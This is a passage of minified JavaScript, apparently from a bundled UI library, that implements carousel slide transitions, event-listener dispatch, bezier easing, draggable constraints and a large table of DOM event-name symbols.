r=Xn(e.slideCssClasses_.get(t),i);e.slideCssClasses_.set(t,i),Xa(t,Array.from(r)),hu(t,Array.from(i))};n(t,this.activeCssClassSet_),i.reverse().forEach((function(t,i){n(t,e.beforeCssClassMap_.get(i))})),r.forEach((function(t,i){n(t,e.afterCssClassMap_.get(i))}))},t.prototype.handleTransition_=function(){if(this.isTransitioning()){var t=this.transition_.hasTransitionedTo(this.transitionTarget_.getElement(),this),e=!this.transitionTarget_.isDrivenBySync();return t?this.transitionTarget_=null:this.transition_.transition(this.transitionTarget_.getElement(),this),e}return!0},t.prototype.getActiveSlide=function(){return this.transition_.getActiveSlide(this)},t.prototype.getActiveClass=function(){return this.activeCssClass_},t.prototype.getActiveSlideIndex=function(){return this.getSlideIndex(this.getActiveSlide())},t.prototype.getFirstSlide=function(){return this.slides_[0]},t.prototype.getLastSlide=function(){return this.slides_[this.slides_.length-1]},t.prototype.getSlideIndex=function(t){return this.getSlides().indexOf(t)},t.prototype.getSlidesBetween=function(t,e){return this.getSlides().slice(this.getSlideIndex(t)+1,this.getSlideIndex(e))},t.prototype.getContainer=function(){return this.container_},t.prototype.getSlides=function(){return yF(this.slides_)},t.prototype.getVisibleSlides=function(){var t=this;return this.getSlides().filter((function(e){return VA(e,t.getContainer())}))},t.prototype.getSlidesBefore=function(t){return this.allowsLooping()?Bp(this.getSlides(),t,!0)[0]:this.getSlides().slice(0,this.getSlides().indexOf(t))},t.prototype.getSlidesAfter=function(t){return this.allowsLooping()?Bp(this.getSlides(),t,!0)[1]:this.getSlides().slice(this.getSlides().indexOf(t)+1)},t.prototype.next=function(){this.transitionSlidesBy(1)},t.prototype.previous=function(){this.transitionSlidesBy(-1)},t.prototype.startInteraction=function(t){void 0===t&&(t=UA),this.clearTransitionTarget_(),this.interactions_.push(t)},t.prototype.endInteraction=function(t){void 0===t&&(t=UA),this.interactions_=_o(this.interactions_,t)},t.prototype.getCurrentTransitionTarget_=function(){return this.isTransitioning()?this.transitionTarget_.getElement():this.getActiveSlide()},t.prototype.transitionSlidesBy=function(t){var e=this.getSlides().indexOf(this.getCurrentTransitionTarget_())+t;this.transitionToIndex(e)},t.prototype.transitionToIndex=function(t,e){void 0===e&&(e=!1),e||Oo.getSingleton().transitionToIndex(this,t);var i=this.getClampedIndex_(t);this.transitionToSlide(this.getSlideByIndex(i),e)},t.prototype.getClampedIndex_=function(t){var e=this.getSlides().length;return this.allowsLooping()?(t%e+e)%e:new Ae(0,e-1).clamp(t)},t.prototype.transitionToSlideByIndex=function(t){console.warn("transitionToSlideByIndex is deprecated, please use transitionToIndex"),this.transitionToIndex(t)},t.prototype.onTransition=function(t){this.onTransitionCallbacks_.push(t)},t.prototype.onDestroy=function(t){this.onDestroyCallbacks_.push(t)},t.prototype.getSlideByIndex=function(t){return this.slides_[t]},t.prototype.enable=function(){this.disabled_=!1},t.prototype.disable=function(){this.disabled_=!0},t.prototype.destroy=function(){var t=this;this.destroyed_=!0,this.renderLoopCallback_&&de.clear(this.renderLoopCallback_),Oo.getSingleton().destroyCarousel(this),this.onDestroyCallbacks_.forEach((function(e){return e(t)}))},t}(),Ro=function(){function t(t){this.target_=t}return t.prototype.getTarget=function(){return this.target_},t.createWatcher=function(t){return co},t}(),wF=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),wu=function(t){function e(e,i,r){var n=t.call(this,e)||this;return n.element_=i,n.delta_=r,n}return wF(e,t),e.prototype.getDelta=function(){return this.delta_},e.prototype.getElement=function(){return this.element_},e}(Ro),EF=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),Eu=function(t){function e(e,i,r){var n=t.call(this,e)||this;return n.delta_=i,n.endVelocity_=r,n}return EF(e,t),e.prototype.getDelta=function(){return this.delta_},e.prototype.getEndVelocity=function(){return this.endVelocity_},e}(Ro),SF=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),Su=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return SF(e,t),e}(Ro),AF=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),HA=function(t){function e(e,i){void 0===e&&(e=[]),void 0===i&&(i=Map);var r=t.call(this)||this;return r.replaceInnerMap(new ti(e,i)),r}return AF(e,t),e}(Di),CF=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},TF=function(){function t(t,e,i,r){this.target_=t,this.EventClass_=e,this.callback_=i,this.destroy_=r}return Object.defineProperty(t.prototype,"target",{get:function(){return this.target_},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"EventClass",{get:function(){return this.EventClass_},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"callback",{get:function(){return this.callback_},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"destroy",{get:function(){return this.destroy_},enumerable:!1,configurable:!0}),t}();function xF(t){var e=t.constructor;return CF([e],za(e))}var IF=new du,PF=function(){function t(){this.listeners_=new HA,this.uidsToCallbackGroups_=new Map}return t.prototype.addListener=function(t,e,i){var r=e.createWatcher(t),n=new TF(t,e,i,r);this.listeners_.get([t,e]).push(n);var s=IF.next().value;return this.uidsToCallbackGroups_.set(s,n),s},t.prototype.removeListener=function(t){var e=this.uidsToCallbackGroups_.get(t);if(void 0!==e){this.uidsToCallbackGroups_.delete(t),e.destroy();var i=this.listeners_.get([e.target,e.EventClass]);i.splice(i.indexOf(e),1)}},t.prototype.getCallbacks=function(t,e){return this.listeners_.get([t,e])},t.prototype.dispatchEvent=function(t){var e=this;xF(t).forEach((function(i){e.getCallbacks(t.getTarget(),i).forEach((function(e){return e.callback(t)}))}))},t}(),Tn=new PF;function ln(t,e){return void 0===e&&(e=null),yu(t,e)+t.offsetWidth/2-(null!==e?e.offsetWidth:er.clientWidth)/2}var Mo=function(){function t(){var t=this;this.cleanMatrix_=Xe.usingFunction((function(t){return fo.fromElementTransform(t)})),this.alteredMatrix_=Xe.usingFunction((function(e){return t.cleanMatrix_.get(e)})),this.init_()}return t.prototype.init_=function(){this.renderLoop_()},t.prototype.getCleanMatrix=function(t){return this.cleanMatrix_.get(t)},t.prototype.getAlteredMatrix=function(t){return this.alteredMatrix_.get(t)},t.prototype.getAlteredXTranslation=function(t){return this.getAlteredMatrix(t).getTranslateX()-this.getCleanMatrix(t).getTranslateX()},t.prototype.getAlteredYTranslation=function(t){return this.getAlteredMatrix(t).getTranslateY()-this.getCleanMatrix(t).getTranslateY()},t.prototype.translate=function(t,e){this.alteredMatrix_.set(t,this.alteredMatrix_.get(t).translate(e))},t.prototype.renderLoop_=function(){var t=this;de.anyMutate((function(){Vr(t.alteredMatrix_.entries(),(function(t){var e=t[0];t[1].applyToElementTransform(e)})),de.anyCleanup((function(){t.cleanMatrix_.clear(),t.alteredMatrix_.clear(),t.renderLoop_()}))}))},t.getSingleton=function(){return this.singleton_=this.singleton_||new this},t.singleton_=null,t}();function xn(t,e){Mo.getSingleton().translate(t,e)}function Xr(t,e){return t<0?e+t%e:t%e}var OF=new Ae(0,1),RF=4,MF=.001,$F=1e-7,LF=10,Ka=11,Au=1/(Ka-1),DF="function"==typeof Float32Array;function GA(t,e){return 1-3*e+3*t}function zA(t,e){return 3*e-6*t}function jA(t){return 3*t}function Cu(t,e,i){return((GA(e,i)*t+zA(e,i))*t+jA(e))*t}function YA(t,e,i){return 3*GA(e,i)*t*t+2*zA(e,i)*t+jA(e)}function kF(t,e,i,r,n){var s,o,a=0;do{(s=Cu(o=e+(i-e)/2,r,n)-t)>0?i=o:e=o}while(Math.abs(s)>$F&&++a<LF);return o}function FF(t,e,i,r){for(var n=0;n<RF;++n){var s=YA(e,i,r);if(0===s)return e;e-=(Cu(e,i,r)-t)/s}return e}function NF(t){return t}function XA(t,e,i,r){if(0<=t&&t<=1&&0<=i&&i<=1||ct.throw("bezier x values must be in [0, 1] range"),t===e&&i===r)return NF;for(var n=DF?new Float32Array(Ka):new Array(Ka),s=0;s<Ka;++s)n[s]=Cu(s*Au,t,i);return function(s){return 0===s?0:1===s?1:Cu(function(e){for(var r=0,s=1,o=Ka-1;s!==o&&n[s]<=e;++s)r+=Au;--s;var a=r+(e-n[s])/(n[s+1]-n[s])*Au,l=YA(a,t,i);return l>=MF?FF(e,a,t,i):0===l?a:kF(e,r,r+Au,t,i)}(s),e,r)}}var si=function(){function t(t,e,i,r){this.calcFunction_=XA(t,e,i,r)}return t.prototype.getAdjustedPercent=function(t){return this.calcFunction_(OF.clamp(t))},t.prototype.asFunction=function(){return this.calcFunction_},t.getFunction=function(t,e,i,r){return XA(t,e,i,r)},t}(),QA=function(){function t(){}return t.EASES_IN_OUT_SINE=si.getFunction(.445,.05,.55,.95),t.EASE_IN_SINE=si.getFunction(.47,0,.745,.715),t.EASE_OUT_SINE=si.getFunction(.39,.575,.565,1),t}(),VF=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},Tu=function(){function t(){this.syncedDraggables_=[]}return t.getSingleton=function(){return this.singleton_=this.singleton_||new this},t.prototype.getSetForDraggable_=function(t){return this.syncedDraggables_.find((function(e){return e.has(t)}))},t.prototype.syncDraggables=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=[],r=[new Set(t)];this.syncedDraggables_.forEach((function(e){t.find((function(t){return e.has(t)}))?r.push(e):i.push(e)})),this.syncedDraggables_=VF(i,[bu.apply(void 0,r)])},t.prototype.renderDrag=function(t,e){var i=this.getSetForDraggable_(t);i||xn(t.getElement(),e),i.forEach((function(t){xn(t.getElement(),e)}))},t.prototype.destroyDraggable=function(t){this.syncedDraggables_.forEach((function(e){return e.delete(t)})),this.syncedDraggables_=this.syncedDraggables_.filter((function(t){return t.size>0}))},t.prototype.destroy=function(){this.syncedDraggables_=[]},t.singleton_=null,t}(),xu=function(){function t(){}return t.prototype.constrain=function(t,e){return console.warn("constrain is not overridden from base case"),e},t.applyConstraints=function(t,e,i){return i.reduce((function(e,i){return i.constrain(t,e)}),e)},t}(),KA=function(){function t(){}return t.prototype.constrain=function(t){return new Je(t.x,0)},t}(),qF=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),BF=new KA,Iu=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return qF(e,t),e.prototype.constrain=function(t,e){return BF.constrain(e)},e}(xu);function Pu(t){return Hr.apply(void 0,t.map((function(t){return t.offsetWidth})))}var WF=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),ZA=function(t){function e(e){var i=t.call(this)||this;return i.container_=e.getContainer(),i.slides_=e.getSlides(),i}return WF(e,t),e.prototype.constrain=function(t,e){var i=this.container_.offsetWidth/2,r=i-Pu(this.slides_)+this.slides_.slice(-1)[0].offsetWidth/2,n=i-this.slides_[0].offsetWidth/2,s=Je.fromElementTransform(t.getElement()).x,o=s+e.getX(),a=new Ae(r,n).clamp(o);return new Je(a-s,e.getY())},e}(xu),k=function(){function t(){}return t.INTERACT=Symbol("interact"),t.TOUCH=Symbol("touch"),t.CURSOR_DOWN=Symbol("cursor down"),t.CURSOR_MOVE=Symbol("cursor move"),t.CURSOR_UP=Symbol("cursor up"),t.ABORT=Symbol("abort"),t.AFTERPRINT=Symbol("afterprint"),t.ANIMATIONEND=Symbol("animationend"),t.ANIMATIONITERATION=Symbol("animationiteration"),t.ANIMATIONSTART=Symbol("animationstart"),t.APPINSTALLED=Symbol("appinstalled"),t.AUDIOPROCESS=Symbol("audioprocess"),t.AUDIOEND=Symbol("audioend"),t.AUDIOSTART=Symbol("audiostart"),t.BEFOREPRINT=Symbol("beforeprint"),t.BEFOREUNLOAD=Symbol("beforeunload"),t.BEGIN_EVENT=Symbol("beginEvent"),t.BLOCKED=Symbol("blocked"),t.BLUR=Symbol("blur"),t.BOUNDARY=Symbol("boundary"),t.CACHED=Symbol("cached"),t.CANPLAY=Symbol("canplay"),t.CANPLAYTHROUGH=Symbol("canplaythrough"),t.CHANGE=Symbol("change"),t.CHARGINGCHANGE=Symbol("chargingchange"),t.CHARGINGTIMECHANGE=Symbol("chargingtimechange"),t.CHECKING=Symbol("checking"),t.CLICK=Symbol("click"),t.CLOSE=Symbol("close"),t.COMPLETE=Symbol("complete"),t.THE=Symbol("The"),t.COMPOSITIONEND=Symbol("compositionend"),t.COMPOSITIONSTART=Symbol("compositionstart"),t.COMPOSITIONUPDATE=Symbol("compositionupdate"),t.CONTEXTMENU=Symbol("contextmenu"),t.COPY=Symbol("copy"),t.CUT=Symbol("cut"),t.DBLCLICK=Symbol("dblclick"),t.DEVICECHANGE=Symbol("devicechange"),t.DEVICELIGHT=Symbol("devicelight"),t.DEVICEMOTION=Symbol("devicemotion"),t.DEVICEORIENTATION=Symbol("deviceorientation"),t.DEVICEPROXIMITY=Symbol("deviceproximity"),t.DISCHARGINGTIMECHANGE=Symbol("dischargingtimechange"),t.DOMACTIVATE=Symbol("DOMActivate"),t.DOMATTRIBUTE_NAME_CHANGED=Symbol("DOMAttributeNameChanged"),t.DOMATTR_MODIFIED=Symbol("DOMAttrModified"),t.DOMCHARACTER_DATA_MODIFIED=Symbol("DOMCharacterDataModified"),t.DOMCONTENT_LOADED=Symbol("DOMContentLoaded"),t.DOMELEMENT_NAME_CHANGED=Symbol("DOMElementNameChanged"),t.DOMFOCUS_IN=Symbol("DOMFocusIn"),t.DOMFOCUS_OUT=Symbol("DOMFocusOut"),t.DOMNODE_INSERTED=Symbol("DOMNodeInserted"),t.DOMNODE_INSERTED_INTO_DOCUMENT=Symbol("DOMNodeInsertedIntoDocument"),t.DOMNODE_REMOVED=Symbol("DOMNodeRemoved"),t.DOMNODE_REMOVED_FROM_DOCUMENT=Symbol("DOMNodeRemovedFromDocument"),t.DOMSUBTREE_MODIFIED=Symbol("DOMSubtreeModified"),t.DOWNLOADING=Symbol("downloading"),t.DRAG=Symbol("drag"),t.DRAGEND=Symbol("dragend"),t.DRAGENTER=Symbol("dragenter"),t.DRAGLEAVE=Symbol("dragleave"),t.DRAGOVER=Symbol("dragover"),t.DRAGSTART=Symbol("dragstart"),t.DROP=Symbol("drop"),t.DURATIONCHANGE=Symbol("durationchange"),t.EMPTIED=Symbol("emptied"),t.END=Symbol("end"),t.ENDED=Symbol("ended"),t.END_EVENT=Symbol("endEvent"),t.ERROR=Symbol("error"),t.FOCUS=Symbol("focus"),t.FOCUSIN=Symbol("focusin"),t.FOCUSOUT=Symbol("focusout"),t.FULLSCREENCHANGE=Symbol("fullscreenchange"),t.FULLSCREENERROR=Symbol("fullscreenerror"),t.GAMEPADCONNECTED=Symbol("gamepadconnected"),t.GAMEPADDISCONNECTED=Symbol("gamepaddisconnected"),t.GOTPOINTERCAPTURE=Symbol("gotpointercapture"),t.HASHCHANGE=Symbol("hashchange"),t.LOSTPOINTERCAPTURE=Symbol("lostpointercapture"),t.INPUT=Symbol("input"),t.INVALID=Symbol("invalid"),t.KEYDOWN=Symbol("keydown"),t.KEYPRESS=Symbol("keypress"),t.KEYUP=Symbol("keyup"),t.LANGUAGECHANGE=Symbol("languagechange"),t.LEVELCHANGE=Symbol("levelchange"),t.LOAD=Symbol("load"),t.LOADEDDATA=Symbol("loadeddata"),t.LOADEDMETADATA=Symbol("loadedmetadata"),t.LOADEND=Symbol("loadend"),t.LOADSTART=Symbol("loadstart"),t.MARK=Symbol("mark"),t.MESSAGE=Symbol("message"),t.MESSAGEERROR=Symbol("messageerror"),t.MOUSEDOWN=Symbol("mousedown"),t.MOUSEENTER=Symbol("mouseenter"),t.MOUSELEAVE=Symbol("mouseleave"),t.MOUSEMOVE=Symbol("mousemove"),t.MOUSEOUT=Symbol("mouseout"),t.MOUSEOVER=Symbol("mouseover"),t.MOUSEUP=Symbol("mouseup"),t.NOMATCH=Symbol("nomatch"),t.NOTIFICATIONCLICK=Symbol("notificationclick"),t.NOUPDATE=Symbol("noupdate"),t.OBSOLETE=Symbol("obsolete"),t.OFFLINE=Symbol("offline"),t.ONLINE=Symbol("online"),t.OPEN=Symbol("open"),t.ORIENTATIONCHANGE=Symbol("orientationchange"),t.PAGEHIDE=Symbol("pagehide"),t.PAGESHOW=Symbol("pageshow"),t.PASTE=Symbol("paste"),t.PAUSE=Symbol("pause"),t.POINTERCANCEL=Symbol("pointercancel"),t.POINTERDOWN=Symbol("pointerdown"),t.POINTERENTER=Symbol("pointerenter"),t.POINTERLEAVE=Symbol("pointerleave"),t.POINTERLOCKCHANGE=Symbol("pointerlockchange"),t.POINTERLOCKERROR=Symbol("pointerlockerror"),t.POINTERMOVE=Symbol("pointermove"),t.POINTEROUT=Symbol("pointerout"),t.POINTEROVER=Symbol("pointerover"),t.POINTERUP=Symbol("pointerup"),t.PLAY=Symbol("play"),t.PLAYING=Symbol("playing"),t.POPSTATE=Symbol("popstate"),t.PROGRESS=Symbol("progress"),t.PUSH=Symbol("push"),t.PUSHSUBSCRIPTIONCHANGE=Symbol("pushsubscriptionchange"),t.RATECHANGE=Symbol("ratechange"),t.READYSTATECHANGE=Symbol("readystatechange"),t.REPEAT_EVENT=Symbol("repeatEvent"),t.RESET=Symbol("reset"),t.RESIZE=Symbol("resize"),t.RESOURCETIMINGBUFFERFULL=Symbol("resourcetimingbufferfull"),t.RESULT=Symbol("result"),t.RESUME=Symbol("resume"),t.SCROLL=Symbol("scroll"),t.SEEKED=Symbol("seeked"),t.SEEKING=Symbol("seeking"),t.SELECT=Symbol("select"),t.SELECTSTART=Symbol("selectstart"),t.SELECTIONCHANGE=Symbol("selectionchange"),t.SHOW=Symbol("show"),t.SOUNDEND=Symbol("soundend"),t.SOUNDSTART=Symbol("soundstart"),t.SPEECHEND=Symbol("speechend"),t.SPEECHSTART=Symbol("speechstart"),t.STALLED=Symbol("stalled"),t.START=Symbol("start"),t.STORAGE=Symbol("storage"),t.SUBMIT=Symbol("submit"),t.SUCCESS=Symbol("success"),t.SUSPEND=Symbol("suspend"),t.SVGABORT=Symbol("SVGAbort"),t.SVGERROR=Symbol("SVGError"),t.SVGLOAD=Symbol("SVGLoad"),t.SVGRESIZE=Symbol("SVGResize"),t.SVGSCROLL=Symbol("SVGScroll"),t.SVGUNLOAD=Symbol("SVGUnload"),t.SVGZOOM=Symbol("SVGZoom"),t.TIMEOUT=Symbol("timeout"),t.TIMEUPDATE=Symbol("timeupdate"),t.TOUCHCANCEL=Symbol("touchcancel"),t.TOUCHEND=Symbol("touchend"),t.TOUCHMOVE=Symbol("touchmove"),t.TOUCHSTART=Symbol("touchstart"),t.TRANSITIONEND=Symbol("transitionend"),t.UNLOAD=Symbol("unload"),t.UPDATEREADY=Symbol("updateready"),t.UPGRADENEEDED=Symbol("upgradeneeded"),t.USERPROXIMITY=Symbol("userproximity"),t.VOICESCHANGED=Symbol("voiceschanged"),t.VERSIONCHANGE=Symbol("versionchange"),t.VISIBILITYCHANGE=Symbol("visibilitychange"),t.VOLUMECHANGE=Symbol("volumechange"),t.WAITING=Symbol("waiting"),t.WHEEL=Symbol("wheel"),t.AFTERSCRIPTEXECUTE=Symbol("afterscriptexecute"),t.BEFORESCRIPTEXECUTE=Symbol("beforescriptexecute"),t.BEFOREINSTALLPROMPT=Symbol("beforeinstallprompt"),t.CARDSTATECHANGE=Symbol("cardstatechange"),t.CONNECTION_INFO_UPDATE=Symbol("connectionInfoUpdate"),t.CFSTATECHANGE=Symbol("cfstatechange"),t.DATACHANGE=Symbol("datachange"),t.DATAERROR=Symbol("dataerror"),t.DOMMOUSE_SCROLL=Symbol("DOMMouseScroll"),t.DRAGDROP=Symbol("dragdrop"),t.DRAGEXIT=Symbol("dragexit"),t.DRAGGESTURE=Symbol("draggesture"),t.ICCCARDLOCKERROR=Symbol("icccardlockerror"),t.ICCINFOCHANGE=Symbol("iccinfochange"),t.LOCALIZED=Symbol("localized"),t.MOUSEWHEEL=Symbol("mousewheel"),t.MOZ_AUDIO_AVAILABLE=Symbol("MozAudioAvailable"),t.MOZ_BEFORE_RESIZE=Symbol("MozBeforeResize"),t.MOZBROWSERACTIVITYDONE=Symbol("mozbrowseractivitydone"),t.MOZBROWSERASYNCSCROLL=Symbol("mozbrowserasyncscroll"),t.MOZBROWSERAUDIOPLAYBACKCHANGE=Symbol("mozbrowseraudioplaybackchange"),t.MOZBROWSERCARETSTATECHANGED=Symbol("mozbrowsercaretstatechanged"),t.MOZBROWSERCLOSE=Symbol("mozbrowserclose"),t.MOZBROWSERCONTEXTMENU=Symbol("mozbrowsercontextmenu"),t.MOZBROWSERDOCUMENTFIRSTPAINT=Symbol("mozbrowserdocumentfirstpaint"),t.MOZBROWSERERROR=Symbol("mozbrowsererror"),t.MOZBROWSERFINDCHANGE=Symbol("mozbrowserfindchange"),t.MOZBROWSERFIRSTPAINT=Symbol("mozbrowserfirstpaint"),t.MOZBROWSERICONCHANGE=Symbol("mozbrowsericonchange"),t.MOZBROWSERLOCATIONCHANGE=Symbol("mozbrowserlocationchange"),t.MOZBROWSERLOADEND=Symbol("mozbrowserloadend"),t.MOZBROWSERLOADSTART=Symbol("mozbrowserloadstart"),t.MOZBROWSERMANIFESTCHANGE=Symbol("mozbrowsermanifestchange"),t.MOZBROWSERMETACHANGE=Symbol("mozbrowsermetachange"),t.MOZBROWSEROPENSEARCH=Symbol("mozbrowseropensearch"),t.MOZBROWSEROPENTAB=Symbol("mozbrowseropentab"),t.MOZBROWSEROPENWINDOW=Symbol("mozbrowseropenwindow"),t.MOZBROWSERRESIZE=Symbol("mozbrowserresize"),t.MOZBROWSERSCROLL=Symbol("mozbrowserscroll"),t.MOZBROWSERSCROLLAREACHANGED=Symbol("mozbrowserscrollareachanged"),t.MOZBROWSERSCROLLVIEWCHANGE=Symbol("mozbrowserscrollviewchange"),t.MOZBROWSERSECURITYCHANGE=Symbol("mozbrowsersecuritychange"),t.MOZBROWSERSELECTIONSTATECHANGED=Symbol("mozbrowserselectionstatechanged"),t.MOZBROWSERSHOWMODALPROMPT=Symbol("mozbrowsershowmodalprompt"),t.MOZBROWSERTITLECHANGE=Symbol("mozbrowsertitlechange"),t.MOZBROWSERUSERNAMEANDPASSWORDREQUIRED=Symbol("mozbrowserusernameandpasswordrequired"),t.MOZBROWSERVISIBILITYCHANGE=Symbol("mozbrowservisibilitychange"),t.MOZ_GAMEPAD_BUTTON_DOWN=Symbol("MozGamepadButtonDown"),t.MOZ_GAMEPAD_BUTTON_UP=Symbol("MozGamepadButtonUp"),t.MOZ_MOUSE_PIXEL_SCROLL=Symbol("MozMousePixelScroll"),t.MOZ_ORIENTATION=Symbol("MozOrientation"),t.MOZ_SCROLLED_AREA_CHANGED=Symbol("MozScrolledAreaChanged"),t.MOZTIMECHANGE=Symbol("moztimechange"),t.MOZ_TOUCH_DOWN=Symbol("MozTouchDown"),t.MOZ_TOUCH_MOVE=Symbol("MozTouchMove"),t.MOZ_TOUCH_UP=Symbol("MozTouchUp"),t.ALERTING=Symbol("alerting"),t.BUSY=Symbol("busy"),t.CALLSCHANGED=Symbol("callschanged"),t.ONCONNECTED=Symbol("onconnected"),t.CONNECTING=Symbol("connecting"),t.DELIVERED=Symbol("delivered"),t.DIALING=Symbol("dialing"),t.DISABLED=Symbol("disabled"),t.DISCONNECTED=Symbol("disconnected"),t.DISCONNECTING=Symbol("disconnecting"),t.ENABLED=Symbol("enabled"),t.HELD=Symbol("held"),t.HOLDING=Symbol("holding"),t.INCOMING=Symbol("incoming"),t.RECEIVED=Symbol("received"),t.RESUMING=Symbol("resuming"),t.SENT=Symbol("sent"),t.STATECHANGE=Symbol("statechange"),t.STATUSCHANGE=Symbol("statuschange"),t.OVERFLOW=Symbol("overflow"),t.SMARTCARD=Symbol("smartcard"),t.STKCOMMAND=Symbol("stkcommand"),t.STKSESSIONEND=Symbol("stksessionend"),t.TEXT=Symbol("text"),t.TOUCHENTER=Symbol("touchenter"),t.TOUCHLEAVE=Symbol("touchleave"),t.UNDERFLOW=Symbol("underflow"),t.UPLOADPROGRESS=Symbol("uploadprogress"),t.USSDRECEIVED=Symbol("ussdreceived"),t.VOICECHANGE=Symbol("voicechange"),t.BROADCAST=Symbol("broadcast"),t.CHECKBOX_STATE_CHANGE=Symbol("CheckboxStateChange"),t.COMMAND=Symbol("command"),t.COMMANDUPDATE=Symbol("commandupdate"),t.DOMMENU_ITEM_ACTIVE=Symbol("DOMMenuItemActive"),t.DOMMENU_ITEM_INACTIVE=Symbol("DOMMenuItemInactive"),t.POPUPHIDDEN=Symbol("popuphidden"),t.POPUPHIDING=Symbol("popuphiding"),t.POPUPSHOWING=Symbol("popupshowing"),t.POPUPSHOWN=Symbol("popupshown"),t.RADIO_STATE_CHANGE=Symbol("RadioStateChange"),t.VALUE_CHANGE=Symbol("ValueChange"),t.ADD=Symbol("Add"),t.MOZ_SWIPE_GESTURE=Symbol("MozSwipeGesture"),t.MOZ_MAGNIFY_GESTURE_START=Symbol("MozMagnifyGestureStart"),t.MOZ_MAGNIFY_GESTURE_UPDATE=Symbol("MozMagnifyGestureUpdate"),t.MOZ_MAGNIFY_GESTURE=Symbol("MozMagnifyGesture"),t.MOZ_ROTATE_GESTURE_START=Symbol("MozRotateGestureStart"),t.MOZ_ROTATE_GESTURE_UPDATE=Symbol("MozRotateGestureUpdate"),t.MOZ_ROTATE_GESTURE=Symbol("MozRotateGesture"),t.MOZ_TAP_GESTURE=Symbol("MozTapGesture"),t.MOZ_PRESS_TAP_GESTURE=Symbol("MozPressTapGesture"),t.MOZ_EDGE_UIGESTURE=Symbol("MozEdgeUIGesture"),t.MOZ_AFTER_PAINT=Symbol("MozAfterPaint"),t.DOMPOPUP_BLOCKED=Symbol("DOMPopupBlocked"),t.DOMWINDOW_CREATED=Symbol("DOMWindowCreated"),t.DOMWINDOW_CLOSE=Symbol("DOMWindowClose"),t.DOMTITLE_CHANGED=Symbol("DOMTitleChanged"),t.DOMLINK_ADDED=Symbol("DOMLinkAdded"),t.DOMLINK_REMOVED=Symbol("DOMLinkRemoved"),t.DOMMETA_ADDED=Symbol("DOMMetaAdded"),t.DOMMETA_REMOVED=Symbol("DOMMetaRemoved"),t.DOMWILL_OPEN_MODAL_DIALOG=Symbol("DOMWillOpenModalDialog"),t.DOMMODAL_DIALOG_CLOSED=Symbol("DOMModalDialogClosed"),t.DOMAUTO_COMPLETE=Symbol("DOMAutoComplete"),t.DOMFRAME_CONTENT_LOADED=Symbol("DOMFrameContentLoaded"),t.ALERT_ACTIVE=Symbol("AlertActive"),t.ALERT_CLOSE=Symbol("AlertClose"),t.FULLSCREEN=Symbol("fullscreen"),t.SIZEMODECHANGE=Symbol("sizemodechange"),t.MOZ_ENTERED_DOM_FULLSCREEN=Symbol("MozEnteredDomFullscreen"),t.SSWINDOW_CLOSING=Symbol("SSWindowClosing"),t.SSTAB_CLOSING=Symbol("SSTabClosing"),t.SSTAB_RESTORING=Symbol("SSTabRestoring"),t.SSTAB_RESTORED=Symbol("SSTabRestored"),t.SSWINDOW_STATE_READY=Symbol("SSWindowStateReady"),t.SSWINDOW_STATE_BUSY=Symbol("SSWindowStateBusy"),t.TAB_OPEN=Symbol("TabOpen"),t.TAB_CLOSE=Symbol("TabClose"),t.TAB_SELECT=Symbol("TabSelect"),t.TAB_SHOW=Symbol("TabShow"),t.TAB_HIDE=Symbol("TabHide"),t.TAB_PINNED=Symbol("TabPinned"),t.TAB_UNPINNED=Symbol("TabUnpinned"),t.CSS_RULE_VIEW_REFRESHED=Symbol("CssRuleViewRefreshed"),t.CSS_RULE_VIEW_CHANGED=Symbol("CssRuleViewChanged"),t.CSS_RULE_VIEW_CSSLINK_CLICKED=Symbol("CssRuleViewCSSLinkClicked"),t}(),$o=new Map([[k.INTERACT,[k.CLICK,k.TOUCH]],[k.CURSOR_DOWN,[k.MOUSEDOWN,k.TOUCHSTART]],[k.CURSOR_MOVE,[k.MOUSEMOVE,k.TOUCHMOVE]],[k.CURSOR_UP,[k.MOUSEUP,k.TOUCHEND]]]),JA=new 